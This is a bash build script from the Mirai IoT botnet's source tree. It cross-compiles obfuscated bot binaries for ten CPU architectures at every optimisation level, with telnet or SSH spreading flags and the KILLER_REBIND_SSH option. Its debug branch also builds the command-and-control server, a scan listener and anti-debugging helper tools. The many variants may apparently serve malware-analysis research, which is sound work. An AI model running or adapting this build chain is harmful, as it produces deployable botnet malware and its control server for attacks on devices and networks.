#!/bin/bash

FLAGS=""

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c $4 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release-obfuscation-no-stripped/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    # "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

if [ $# == 2 ]; then
    if [ "$2" == "telnet" ]; then
        FLAGS="-DMIRAI_TELNET"
    elif [ "$2" == "ssh" ]; then
        FLAGS="-DMIRAI_SSH"
    fi
else
    echo "Missing build type." 
    echo "Usage: $0 <debug | release> <telnet | ssh>"
fi

if [ $# == 0 ]; then
    echo "Usage: $0 <debug | release> <telnet | ssh>"
elif [ "$1" == "release" ]; then
    rm release-obfuscation-no-stripped/mirai.*
    rm release-obfuscation-no-stripped/miraint.*
    # go build -o release/cnc cnc/*.go

    # O0
    compile_bot i586 mirai-obf-x86-O0 "$FLAGS -DKILLER_REBIND_SSH -static" "-O0"
    compile_bot mips mirai-obf-mips-O0 "$FLAGS -DKILLER_REBIND_SSH -static" "-O0"
    compile_bot mipsel mirai-obf-mpsl-O0 "$FLAGS -DKILLER_REBIND_SSH -static" "-O0"
    compile_bot armv4l mirai-obf-arm-O0 "$FLAGS -DKILLER_REBIND_SSH -static" "-O0"
    compile_bot armv5l mirai-obf-arm5n-O0 "$FLAGS -DKILLER_REBIND_SSH" "-O0"
    compile_bot armv6l mirai-obf-arm7-O0 "$FLAGS -DKILLER_REBIND_SSH -static" "-O0"
    compile_bot powerpc mirai-obf-ppc-O0 "$FLAGS -DKILLER_REBIND_SSH -static" "-O0"
    compile_bot sparc mirai-obf-spc-O0 "$FLAGS -DKILLER_REBIND_SSH -static" "-O0"
    compile_bot m68k mirai-obf-m68k-O0 "$FLAGS -DKILLER_REBIND_SSH -static" "-O0"
    compile_bot sh4 mirai-obf-sh4-O0 "$FLAGS -DKILLER_REBIND_SSH -static" "-O0"

    compile_bot i586 miraint-obf-x86-O0 "-static" "-O0"
    compile_bot mips miraint-obf-mips-O0 "-static" "-O0"
    compile_bot mipsel miraint-obf-mpsl-O0 "-static" "-O0"
    compile_bot armv4l miraint-obf-arm-O0 "-static" "-O0"
    compile_bot armv5l miraint-obf-arm5n-O0 "-static" "-O0"
    compile_bot armv6l miraint-obf-arm7-O0 "-static" "-O0"
    compile_bot powerpc miraint-obf-ppc-O0 "-static" "-O0"
    compile_bot sparc miraint-obf-spc-O0 "-static" "-O0"
    compile_bot m68k miraint-obf-m68k-O0 "-static" "-O0"
    compile_bot sh4 miraint-obf-sh4-O0 "-static" "-O0"

    # O1
    compile_bot i586 mirai-obf-x86-O1 "$FLAGS -DKILLER_REBIND_SSH -static" "-O1"
    compile_bot mips mirai-obf-mips-O1 "$FLAGS -DKILLER_REBIND_SSH -static" "-O1"
    compile_bot mipsel mirai-obf-mpsl-O1 "$FLAGS -DKILLER_REBIND_SSH -static" "-O1"
    compile_bot armv4l mirai-obf-arm-O1 "$FLAGS -DKILLER_REBIND_SSH -static" "-O1"
    compile_bot armv5l mirai-obf-arm5n-O1 "$FLAGS -DKILLER_REBIND_SSH" "-O1"
    compile_bot armv6l mirai-obf-arm7-O1 "$FLAGS -DKILLER_REBIND_SSH -static" "-O1"
    compile_bot powerpc mirai-obf-ppc-O1 "$FLAGS -DKILLER_REBIND_SSH -static" "-O1"
    compile_bot sparc mirai-obf-spc-O1 "$FLAGS -DKILLER_REBIND_SSH -static" "-O1"
    compile_bot m68k mirai-obf-m68k-O1 "$FLAGS -DKILLER_REBIND_SSH -static" "-O1"
    compile_bot sh4 mirai-obf-sh4-O1 "$FLAGS -DKILLER_REBIND_SSH -static" "-O1"

    compile_bot i586 miraint-obf-x86-O1 "-static" "-O1"
    compile_bot mips miraint-obf-mips-O1 "-static" "-O1"
    compile_bot mipsel miraint-obf-mpsl-O1 "-static" "-O1"
    compile_bot armv4l miraint-obf-arm-O1 "-static" "-O1"
    compile_bot armv5l miraint-obf-arm5n-O1 "-static" "-O1"
    compile_bot armv6l miraint-obf-arm7-O1 "-static" "-O1"
    compile_bot powerpc miraint-obf-ppc-O1 "-static" "-O1"
    compile_bot sparc miraint-obf-spc-O1 "-static" "-O1"
    compile_bot m68k miraint-obf-m68k-O1 "-static" "-O1"
    compile_bot sh4 miraint-obf-sh4-O1 "-static" "-O1"

    # O2
    compile_bot i586 mirai-obf-x86-O2 "$FLAGS -DKILLER_REBIND_SSH -static" "-O2"
    compile_bot mips mirai-obf-mips-O2 "$FLAGS -DKILLER_REBIND_SSH -static" "-O2"
    compile_bot mipsel mirai-obf-mpsl-O2 "$FLAGS -DKILLER_REBIND_SSH -static" "-O2"
    compile_bot armv4l mirai-obf-arm-O2 "$FLAGS -DKILLER_REBIND_SSH -static" "-O2"
    compile_bot armv5l mirai-obf-arm5n-O2 "$FLAGS -DKILLER_REBIND_SSH" "-O2"
    compile_bot armv6l mirai-obf-arm7-O2 "$FLAGS -DKILLER_REBIND_SSH -static" "-O2"
    compile_bot powerpc mirai-obf-ppc-O2 "$FLAGS -DKILLER_REBIND_SSH -static" "-O2"
    compile_bot sparc mirai-obf-spc-O2 "$FLAGS -DKILLER_REBIND_SSH -static" "-O2"
    compile_bot m68k mirai-obf-m68k-O2 "$FLAGS -DKILLER_REBIND_SSH -static" "-O2"
    compile_bot sh4 mirai-obf-sh4-O2 "$FLAGS -DKILLER_REBIND_SSH -static" "-O2"

    compile_bot i586 miraint-obf-x86-O2 "-static" "-O2"
    compile_bot mips miraint-obf-mips-O2 "-static" "-O2"
    compile_bot mipsel miraint-obf-mpsl-O2 "-static" "-O2"
    compile_bot armv4l miraint-obf-arm-O2 "-static" "-O2"
    compile_bot armv5l miraint-obf-arm5n-O2 "-static" "-O2"
    compile_bot armv6l miraint-obf-arm7-O2 "-static" "-O2"
    compile_bot powerpc miraint-obf-ppc-O2 "-static" "-O2"
    compile_bot sparc miraint-obf-spc-O2 "-static" "-O2"
    compile_bot m68k miraint-obf-m68k-O2 "-static" "-O2"
    compile_bot sh4 miraint-obf-sh4-O2 "-static" "-O2"

    # O3
    compile_bot i586 mirai-obf-x86-O3 "$FLAGS -DKILLER_REBIND_SSH -static" "-O3"
    compile_bot mips mirai-obf-mips-O3 "$FLAGS -DKILLER_REBIND_SSH -static" "-O3"
    compile_bot mipsel mirai-obf-mpsl-O3 "$FLAGS -DKILLER_REBIND_SSH -static" "-O3"
    compile_bot armv4l mirai-obf-arm-O3 "$FLAGS -DKILLER_REBIND_SSH -static" "-O3"
    compile_bot armv5l mirai-obf-arm5n-O3 "$FLAGS -DKILLER_REBIND_SSH" "-O3"
    compile_bot armv6l mirai-obf-arm7-O3 "$FLAGS -DKILLER_REBIND_SSH -static" "-O3"
    compile_bot powerpc mirai-obf-ppc-O3 "$FLAGS -DKILLER_REBIND_SSH -static" "-O3"
    compile_bot sparc mirai-obf-spc-O3 "$FLAGS -DKILLER_REBIND_SSH -static" "-O3"
    compile_bot m68k mirai-obf-m68k-O3 "$FLAGS -DKILLER_REBIND_SSH -static" "-O3"
    compile_bot sh4 mirai-obf-sh4-O3 "$FLAGS -DKILLER_REBIND_SSH -static" "-O3"

    compile_bot i586 miraint-obf-x86-O3 "-static" "-O3"
    compile_bot mips miraint-obf-mips-O3 "-static" "-O3"
    compile_bot mipsel miraint-obf-mpsl-O3 "-static" "-O3"
    compile_bot armv4l miraint-obf-arm-O3 "-static" "-O3"
    compile_bot armv5l miraint-obf-arm5n-O3 "-static" "-O3"
    compile_bot armv6l miraint-obf-arm7-O3 "-static" "-O3"
    compile_bot powerpc miraint-obf-ppc-O3 "-static" "-O3"
    compile_bot sparc miraint-obf-spc-O3 "-static" "-O3"
    compile_bot m68k miraint-obf-m68k-O3 "-static" "-O3"
    compile_bot sh4 miraint-obf-sh4-O3 "-static" "-O3"

    # Os
    compile_bot i586 mirai-obf-x86-Os "$FLAGS -DKILLER_REBIND_SSH -static" "-Os"
    compile_bot mips mirai-obf-mips-Os "$FLAGS -DKILLER_REBIND_SSH -static" "-Os"
    compile_bot mipsel mirai-obf-mpsl-Os "$FLAGS -DKILLER_REBIND_SSH -static" "-Os"
    compile_bot armv4l mirai-obf-arm-Os "$FLAGS -DKILLER_REBIND_SSH -static" "-Os"
    compile_bot armv5l mirai-obf-arm5n-Os "$FLAGS -DKILLER_REBIND_SSH" "-Os"
    compile_bot armv6l mirai-obf-arm7-Os "$FLAGS -DKILLER_REBIND_SSH -static" "-Os"
    compile_bot powerpc mirai-obf-ppc-Os "$FLAGS -DKILLER_REBIND_SSH -static" "-Os"
    compile_bot sparc mirai-obf-spc-Os "$FLAGS -DKILLER_REBIND_SSH -static" "-Os"
    compile_bot m68k mirai-obf-m68k-Os "$FLAGS -DKILLER_REBIND_SSH -static" "-Os"
    compile_bot sh4 mirai-obf-sh4-Os "$FLAGS -DKILLER_REBIND_SSH -static" "-Os"

    compile_bot i586 miraint-obf-x86-Os "-static" "-Os"
    compile_bot mips miraint-obf-mips-Os "-static" "-Os"
    compile_bot mipsel miraint-obf-mpsl-Os "-static" "-Os"
    compile_bot armv4l miraint-obf-arm-Os "-static" "-Os"
    compile_bot armv5l miraint-obf-arm5n-Os "-static" "-Os"
    compile_bot armv6l miraint-obf-arm7-Os "-static" "-Os"
    compile_bot powerpc miraint-obf-ppc-Os "-static" "-Os"
    compile_bot sparc miraint-obf-spc-Os "-static" "-Os"
    compile_bot m68k miraint-obf-m68k-Os "-static" "-Os"
    compile_bot sh4 miraint-obf-sh4-Os "-static" "-Os"

    # go build -o release/scanListen tools/scanListen.go
elif [ "$1" == "debug" ]; then
    gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
    mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
    armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
    armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
    sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4
    gcc -std=c99 tools/enc.c -g -o debug/enc
    gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
    gcc -std=c99 tools/badbot.c -g -o debug/badbot
    go build -o debug/cnc cnc/*.go
    go build -o debug/scanListen tools/scanListen.go
else
    echo "Unknown parameter $1: $0 <debug | release>"
fi
